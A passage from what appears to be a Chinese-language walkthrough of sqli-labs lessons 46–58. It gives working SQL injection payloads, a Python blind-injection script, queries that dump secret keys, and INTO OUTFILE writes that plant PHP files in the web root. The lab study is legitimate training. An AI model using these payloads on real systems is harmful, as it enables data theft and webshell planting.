</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br></div></div><p><img src="/medias/sqli-labs/90.png" alt="90"></p> <h3 id="order-by-数字-procedure-analyse-payload-数字"><a href="#order-by-数字-procedure-analyse-payload-数字" class="header-anchor">#</a> order by + 数字 + procedure analyse(payload,数字)</h3> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">procedure</span> analyse<span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/91.png" alt="91"></p> <h3 id="order-by-数字-into-outfile-文件路径"><a href="#order-by-数字-into-outfile-文件路径" class="header-anchor">#</a> order by + 数字 + into outfile '文件路径'</h3> <p>把查询结果写入文件</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/Less-46/1.php'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/92.png" alt="92"></p> <p>能写马子吗？好像可以的，使用<code>lines terminated by</code>来给写入的内容每一行末尾添加自定义内容！！🤯</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/Less-46/2.php'</span> <span class="token keyword">lines</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token number">0x3c3f3d706870696e666f28293b3f3e</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/93.png" alt="93"></p> <h2 id="less-47"><a href="#less-47" class="header-anchor">#</a> Less-47</h2> <p>利用order by 数字注入</p> <p>原来order by也可以<code>order by '0' or 1=1</code>这样</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">0</span>' <span class="token operator">or</span> updatexml<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/94.png" alt="94"></p> <p>order by + 数字 + procedure analyse(payload,数字)</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">procedure</span> analyse<span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">14514</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/95.png" alt="95"></p> <p>order by + 数字 + into outfile '文件路径'</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">0</span><span class="token string">' into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">47</span><span class="token operator">/</span><span class="token number">1.</span>php'  <span class="token keyword">lines</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token number">0x3c3f3d706870696e666f28293b3f3e</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/96.png" alt="96"></p> <h2 id="less-48"><a href="#less-48" class="header-anchor">#</a> Less-48</h2> <p>这道题测试后台语法没有报错信息，直接试时间盲注</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/97.png" alt="97"></p> <p>脚本梭哈</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token comment"># 下划线放最后，避免当作统配符吃掉特殊字符</span>
flags <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'</span>
flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

url <span class="token operator">=</span> <span class="token string">&quot;http://127.0.0.1:8080/Less-48/&quot;</span>
i <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;脚本正在运行.......&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    
    <span class="token keyword">for</span> s <span class="token keyword">in</span> flags<span class="token punctuation">:</span>
        <span class="token comment"># 爆库</span>
        sort <span class="token operator">=</span> <span class="token string">&quot;if((substr((select group_concat(schema_name) from information_schema.schemata),&quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;,1)='&quot;</span><span class="token operator">+</span> s <span class="token operator">+</span><span class="token string">&quot;'),sleep(0.1),0)&quot;</span>
        <span class="token comment"># 爆表</span>
        <span class="token comment"># sort = &quot;if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)%23&quot;</span>
        <span class="token comment"># 爆字段</span>
        <span class="token comment"># sort = &quot;if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)%23&quot;</span>
        tmp_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&quot;?sort=&quot;</span> <span class="token operator">+</span> sort
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tmp_url<span class="token punctuation">)</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">0.1</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> s
            <span class="token comment"># 当盲注出正确字符时，才去盲注下一位(变量i的作用)</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[#]------result: </span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">elif</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;跑了这么久，跑完了吗？跑完我给你停了🤓👍&quot;</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br></div></div><p><img src="/medias/sqli-labs/98.png" alt="98"></p> <p>写个马子</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/Less-48/1.php'</span> <span class="token keyword">lines</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token number">0x3c3f3d706870696e666f28293b3f3e</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-49"><a href="#less-49" class="header-anchor">#</a> Less-49</h2> <p>时间盲注猜闭合方式</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">0</span>' <span class="token operator">or</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/99.png" alt="99"></p> <p>猜出后台闭合方式可以直接改脚本了，或者写个马子进去</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">0</span><span class="token string">' into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">49</span><span class="token operator">/</span><span class="token number">1.</span>php' <span class="token keyword">lines</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token number">0x3c3f3d706870696e666f28293b3f3e</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/100.png" alt="100"></p> <h2 id="less-50"><a href="#less-50" class="header-anchor">#</a> Less-50</h2> <p>时间盲注猜出后台是，整数型</p> <p><img src="/medias/sqli-labs/101.png" alt="101"></p> <p>怎么跟<code>Less-48</code>一样？翻看源码，发现这道题可以堆叠注入了</p> <p><img src="/medias/sqli-labs/102.png" alt="102"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo();?&gt;'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span><span class="token string">'/var/www/html/Less-50/1.php'</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-51"><a href="#less-51" class="header-anchor">#</a> Less-51</h2> <p>时间盲注猜出后台是，单引号类型</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">0</span>' <span class="token operator">or</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/103.png" alt="103"></p> <p>末尾写马、堆叠写马、盲注</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">0</span><span class="token string">' into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">51</span><span class="token operator">/</span><span class="token number">1.</span>php' <span class="token keyword">lines</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token number">0x3c3f3d706870696e666f28293b3f3e</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">0</span><span class="token string">';select '</span><span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span class="token string">' into outfile'</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">51</span><span class="token operator">/</span><span class="token number">1.</span>php'<span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-52"><a href="#less-52" class="header-anchor">#</a> Less-52</h2> <p>时间盲注猜出后台是，整型</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">0</span> <span class="token operator">or</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>末尾写马、堆叠写马、盲注</p> <p>发现个小问题，前面<code>Less-51</code>写马的时候，字符型<code>order by '0'</code>成功写马，这道题整数型<code>order by 0</code>就失败了，换成<code>order by 1</code>可以正常写入</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/Less-52/1.php'</span> <span class="token keyword">lines</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token number">0x3c3f3d706870696e666f28293b3f3e</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo();?&gt;'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span><span class="token string">'/var/www/html/Less-52/1.php'</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-53"><a href="#less-53" class="header-anchor">#</a> Less-53</h2> <p>时间盲注测试出后台是，单引号类型</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">0</span>' <span class="token operator">or</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>末尾写马、堆叠写马、盲注</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">0</span><span class="token string">' into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">53</span><span class="token operator">/</span><span class="token number">1.</span>php' <span class="token keyword">lines</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token number">0x3c3f3d706870696e666f28293b3f3e</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">0</span><span class="token string">';select '</span><span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span class="token string">' into outfile'</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">53</span><span class="token operator">/</span><span class="token number">1.</span>php'<span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-54"><a href="#less-54" class="header-anchor">#</a> Less-54</h2> <p>老天奶，终于到page 4了</p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>The objective of this challenge is to dump the (secret key) from only random table from Database ('CHALLENGES') in Less than 10 attempts
For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.</p></div> <p>在挑战次数小于10次时，数据库<code>CHALLENGES</code>会根据密钥生成随机表，超过10次，会根据密钥生成随机表，随机列，随机数据</p> <p>10命通关吗，有点意思</p> <p>或许也可以通过使用代理、切换浏览器、清楚cookie等方式绕过服务器的次数限制，这里好像是根据cookie记录的，次数快到了清楚cookie刷新页面</p> <p>测试后台闭合方式</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>'<span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/104.png" alt="104"></p> <p>2，3为回显位</p> <p><img src="/medias/sqli-labs/105.png" alt="105"></p> <p>两个回显位，干脆一次爆表、爆字段</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/106.png" alt="106"></p> <p>爆数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">'union select 1,2,(select group_concat(id,'</span><span class="token comment">-----',sessid,'-----',secret_3182,'-----',tryy) from B77BC4ZQI3)%23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/107.png" alt="107"></p> <h2 id="less-55"><a href="#less-55" class="header-anchor">#</a> Less-55</h2> <p>测试后台闭合方式</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/108.png" alt="108"></p> <p>爆表、爆字段</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/109.png" alt="109"></p> <p>爆数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span><span class="token string">'-----'</span><span class="token punctuation">,</span>sessid<span class="token punctuation">,</span><span class="token string">'-----'</span><span class="token punctuation">,</span>secret_3182<span class="token punctuation">,</span><span class="token string">'-----'</span><span class="token punctuation">,</span>tryy<span class="token punctuation">)</span> <span class="token keyword">from</span> B77BC4ZQI3<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/110.png" alt="110"></p> <h2 id="less-56"><a href="#less-56" class="header-anchor">#</a> Less-56</h2> <p>测试后台闭合方式</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>'<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/111.png" alt="111"></p> <p>爆表、爆字段</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/112.png" alt="112"></p> <p>爆数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">') union select 1,2,(select group_concat(id,'</span><span class="token comment">-----',sessid,'-----',secret_8N8A,'-----',tryy) from 07Z057A61B)%23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/113.png" alt="113"></p> <h2 id="less-57"><a href="#less-57" class="header-anchor">#</a> Less-57</h2> <p>测试后台闭合方式，双引号类型 测了11次</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>&quot; <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/114.png" alt="114"></p> <p>爆表、爆字段</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>&quot; <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/115.png" alt="115"></p> <p>爆数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>&quot; <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span><span class="token string">'-----'</span><span class="token punctuation">,</span>sessid<span class="token punctuation">,</span><span class="token string">'-----'</span><span class="token punctuation">,</span>secret_W1BG<span class="token punctuation">,</span><span class="token string">'-----'</span><span class="token punctuation">,</span>tryy<span class="token punctuation">)</span> <span class="token keyword">from</span> RGQEZ8TA8R<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/116.png" alt="116"></p> <h2 id="less-58"><a href="#less-58" class="header-anchor">#</a> Less-58</h2> <p>测试后台闭合方式</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/117.png" alt="117"></p> <p>联合查询没有回显，但是测试过程有报错，报错注入</p> <p>爆表、字段</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 表名 1I2IZXOTD3</span>
